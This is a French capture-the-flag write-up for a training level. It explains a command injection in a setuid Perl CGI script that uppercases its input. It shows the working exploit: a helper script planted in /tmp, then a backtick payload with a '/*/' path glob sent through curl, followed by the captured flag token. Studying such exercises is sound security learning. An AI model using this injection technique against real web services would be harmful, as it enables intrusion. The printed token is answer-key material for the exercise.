# Level 12

Home structure
```
$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

Comme le script dans level 04, le script récupère les paramètres `x` et `y` d'une requête HTTP, exécute la commande système `egrep` pour rechercher dans le fichier `/tmp/xd` en utilisant la valeur de `x` en ayant mis toutes les lettres en majuscules avant, puis affiche des points en fonction des résultats de la recherche et de la valeur de `y`. Le nombre de points affichés dépend de la correspondance trouvée et de la valeur de `y`.

Ce qui voudrait dire qu'on pourrait exécuter n'importe quel commandes via le paramètre `x`.

On pourrait tous simplement essayer: `curl localhost:4646/level12.pl?x='${getflag}'`, mais on va que le script va rendre le paramètre X tous en maj. Donc ce qui nous fait `${GETFLAG}` et la commande `GETFLAG` n'existe pas. Alors ce qui faudrait faire c'est le créer.

```
$ echo "getflag | wall" > /tmp/GETFLAG
$ chmod 777 /tmp/GETFLAG
$ curl localhost:4646/level12.pl?x='`/*/GETFLAG`'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
On est malheureusement obligé de mettre le `/*/` pour compléter le path sans mettre de minuscule (`/tmp/` va se transformer en `/TMP/` ce qui n'existe pas.)
